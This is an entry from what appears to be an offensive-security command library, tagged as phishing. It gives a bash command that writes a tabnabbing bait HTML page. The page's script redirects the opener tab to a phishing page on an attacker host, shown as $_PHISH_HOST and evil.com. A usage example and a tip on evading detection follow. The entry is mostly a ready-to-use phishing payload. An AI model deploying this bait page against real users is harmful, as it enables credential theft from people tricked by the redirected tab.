---
id: f3684a32-4af8-47fa-baa2-eb195b35eae4
name: create-tabnabbing-bait-html
type: command
executor: bash
data: >-
  echo '<!DOCTYPE html><html><head><title>Interesting
  Article</title></head><body><h1>Click here for more
  info</h1><script>window.opener.location =
  "http://$_PHISH_HOST/phish.html";</script><p>Distracting
  content...</p></body></html>' > bait.html
output: null
created_at: '2023-04-06T03:56:40.534430+00:00'
updated_at: '2023-04-06T03:56:40.549388+00:00'
platforms:
  - Linux
  - macOS
tags:
  - phishing
  - html-generation
verified: true
validated: true
---

# create-tabnabbing-bait-html

## Command

```bash
echo '<!DOCTYPE html><html><head><title>Interesting Article</title></head><body><h1>Click here for more info</h1><script>window.opener.location = "http://$_PHISH_HOST/phish.html";</script><p>Distracting content...</p></body></html>' > bait.html
```

## Description

This command creates an HTML file for the tabnabbing bait page, embedding JavaScript that redirects the opener window to a phishing URL upon loading in a new tab.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PHISH_HOST | Domain or IP hosting the phishing page (e.g., evil.com) | Yes |

## Examples

### Basic Usage

```bash
echo '<!DOCTYPE html><html><head><title>Interesting Article</title></head><body><h1>Click here for more info</h1><script>window.opener.location = "http://evil.com/phish.html";</script><p>Distracting content...</p></body></html>' > bait.html
```

### Advanced Usage

Add more distracting content or meta tags to evade detection:

```bash
echo '<!DOCTYPE html><html><head><title>Article</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body>...</body></html>' > bait.html
```

## Expected Output

No stdout output; creates 'bait.html' file. Verify with:

```bash
cat bait.html
```

Output shows the HTML with embedded script.

## Related

- [[procedures/Tabnabbing-Phishing-Redirect-Attack]]
- [[commands/create-phishing-login-html]]
